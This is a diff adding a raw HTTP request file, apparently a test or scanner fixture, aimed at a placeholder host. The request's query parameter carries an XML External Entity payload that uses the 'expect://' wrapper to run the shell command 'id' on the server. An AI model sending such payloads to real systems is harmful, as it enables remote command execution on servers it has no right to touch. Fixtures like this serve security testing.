@@ -1,0 +1,4 @@
+GET /a?name=<!DOCTYPE%20r%20[<!ENTITY%20x%20SYSTEM%20"expect://id">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
